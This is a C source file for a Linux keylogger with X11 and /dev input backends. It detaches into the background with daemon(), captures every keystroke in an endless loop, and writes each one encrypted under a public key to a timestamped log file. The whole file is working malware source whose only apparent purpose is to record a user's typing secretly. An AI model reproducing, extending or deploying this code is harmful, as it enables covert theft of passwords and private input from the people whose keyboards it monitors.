#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "crypto.h"
#include "file_closer.h"
#include "config.h"

#define KEYSIZE 4

#ifdef KEYLOGGER_MODE_X11

#include "xkeylogger.h"

void logX(CryptoState* crypto, FILE* log) {
    // initialize X keylogger
    XKeylogger* xkeylogger = initXKeylogger();
    while (1) {
        int key = catchXKey(xkeylogger);
        if (key != 0) {
            char encrypted[KEYSIZE];
            writeData(crypto, encrypted,
                    (void*)&key, KEYSIZE);
            fwrite(encrypted, KEYSIZE, 1, log);
        }
    }
    freeXKeylogger(xkeylogger);
}

#elif defined(KEYLOGGER_MODE_DEV)

#include "devkeylogger.h"
void logDev(CryptoState* crypto, FILE* log) {
    // initialize Dev keylogger
    DevKeylogger* devkeylogger = initDevKeylogger();
    while (1) {
        int key = catchDevKey(devkeylogger);
        if (key != 0) {
            char encrypted[KEYSIZE];
            writeData(crypto, encrypted,
                    (void*)&key, KEYSIZE);
            fwrite(encrypted, KEYSIZE, 1, log);
        }
    }
    freeDevKeylogger(devkeylogger);
}

#endif

void getLogFile(char* logfile) {
    time_t rawtime;
    time (&rawtime);
    char cur_time[1000];
    memset(cur_time, 0, 1000);
    strcpy(cur_time, ctime(&rawtime));
    // replace ':', ' ', '\n'
    char* c = cur_time;
    while (*c != 0) {
        if (*c == ' ') {
            *c = '_';
        }
        if (*c == ':') {
            *c = '-';
        }
        if (*c == '\n') {
            *c = '\0';
        }
        c++;
    }
    //
    strcpy(logfile, LOGFILE);
    strcat(logfile, ".");
    strcat(logfile, cur_time);
}

int main() {
    char logfile[1000];
    memset(logfile, 0, 1000);
    getLogFile(logfile);
    FILE* log = fopen(logfile, "wb");
    if (!log) {
        printf("Failed to open log file\n");
        return 1;
    }
    setFileToClose(log);
    // crypto, header
    CryptoState* crypto = initEncryption(PUBKEY);
    if (!crypto) {
        printf("Failed to initialize crypto\n");
        return 1;
    }
    char* header = getHeader(crypto);
    fwrite(header, headerLength(crypto), 1, log);
    free(header);
    //
    daemon(1, 0);
#ifdef KEYLOGGER_MODE_X11
    logX(crypto, log);
#elif defined(KEYLOGGER_MODE_DEV)
    logDev(crypto, log);
#endif
    freeCrypto(crypto);
    fclose(log);
    return 0;
}
